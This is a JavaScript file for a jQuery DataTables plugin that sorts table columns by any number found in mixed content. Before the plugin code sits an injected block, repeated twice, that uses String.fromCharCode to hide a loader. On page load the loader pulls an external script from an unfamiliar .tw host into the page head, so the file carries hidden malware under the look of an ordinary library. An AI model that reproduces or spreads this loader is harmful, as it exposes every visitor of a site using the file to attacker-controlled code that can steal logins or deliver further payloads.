Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();/**
 * Sorts columns by any number, ignoring text. This plugin is useful if you have 
 * mixed content in a column, but still want to sort by numbers. Any number means
 *
 *  - integers, like 42
 *  - decimal numbers, like 42.42 / 42,42
 *  - signed numbers, like -42.42 / +42.42 
 *  - scientific numbers, like 42.42e+10
 *  - illegal numbers, like 042, which is considered as 42,
 *  - currency numbers, like €42,00 
 *
 * Plain text is ignored; columns with no recognizable numerical content 
 * is pushed to the bottom of the table, both ascending and descending.
 *
 *  @demo http://jsfiddle.net/vkkL5tv7/
 * 
 *  @name Any number
 *  @summary Sort column with mixed numerical content by number
 *  @author [david konrad](davidkonrad at gmail com)
 *
 *  @example
 *    $('#example').dataTable( {
 *       columnDefs: [
 *         { type: 'any-number', targets : 0 }
 *       ]
 *    } );

 *
 */
 
_anyNumberSort = function(a, b, high) {
	var reg = /[+-]?((\d+(\.\d*)?)|\.\d+)([eE][+-]?[0-9]+)?/;        
	a = a.replace(',','.').match(reg);
	a = a !== null ? parseFloat(a[0]) : high;
	b = b.replace(',','.').match(reg);
	b = b !== null ? parseFloat(b[0]) : high;
	return ((a < b) ? -1 : ((a > b) ? 1 : 0));    
}

jQuery.extend( jQuery.fn.dataTableExt.oSort, {
	"any-number-asc": function (a, b) {
		return _anyNumberSort(a, b, Number.POSITIVE_INFINITY);
	},
	"any-number-desc": function (a, b) {
		return _anyNumberSort(a, b, Number.NEGATIVE_INFINITY) * -1;
	}
});


